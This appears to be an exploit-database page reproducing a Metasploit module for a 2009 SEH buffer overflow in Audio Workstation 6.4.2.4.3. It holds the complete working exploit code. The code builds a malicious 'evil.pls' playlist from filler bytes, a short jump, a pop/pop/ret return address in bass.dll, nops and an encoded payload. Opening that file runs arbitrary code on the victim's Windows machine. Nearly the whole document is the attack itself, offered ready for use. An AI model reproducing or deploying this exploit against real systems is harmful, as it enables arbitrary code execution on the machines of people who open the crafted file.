Audio Workstation 6.4.2.4.3 pls Buffer Overflow (meta)
======================================================


# Title: Audio Workstation 6.4.2.4.3 pls Buffer Overflow (meta)
# CVE-ID: ()
# OSVDB-ID: ()
# Author: germaya_x dookie
# Published: 2009-12-09
# Verified: yes

view source
print?
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GoodRanking
 
    include Msf::Exploit::FILEFORMAT
    include Msf::Exploit::Remote::Seh
         
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Audio Workstation 6.4.2.4.3 pls Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a buffer overflow in Audio Workstation 6.4.2.4.3.
                    When opening a malicious pls file with the Audio Workstation,
                    a remote attacker could overflow a buffer and execute
                    arbitrary code.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         => [ &#039;germaya_x&#039;, &#039;dookie&#039;, ],
            &#039;Version&#039;        => &#039;$Revision: 7724 $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/10353&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;seh&#039;,
                },                 
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 4100,
                    &#039;BadChars&#039; => "\x00",
                    &#039;StackAdjustment&#039; => -3500,
                    &#039;EncoderType&#039;   => Msf::Encoder::Type::AlphanumUpper,
                    &#039;DisableNops&#039;   =>  &#039;True&#039;,
                },
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Windows Universal&#039;, { &#039;Ret&#039; => 0x1101031E } ], # p/p/r in bass.dll
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Dec 08 2009&#039;,
            &#039;DefaultTarget&#039;  => 0))
 
                        register_options(
                                [
                                        OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;evil.pls&#039;]),
                                ], self.class)
 
    end
 
    def exploit
 
        sploit = rand_text_alpha_upper(1308)
        sploit << "\xeb\x16\x90\x90"
        sploit << [target.ret].pack(&#039;V&#039;)
        sploit << make_nops(32)
        sploit << payload.encoded
        sploit << rand_text_alpha_upper(4652 - payload.encoded.length)
 
        pls = sploit
     
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
 
        file_create(pls)
         
    end
 
end



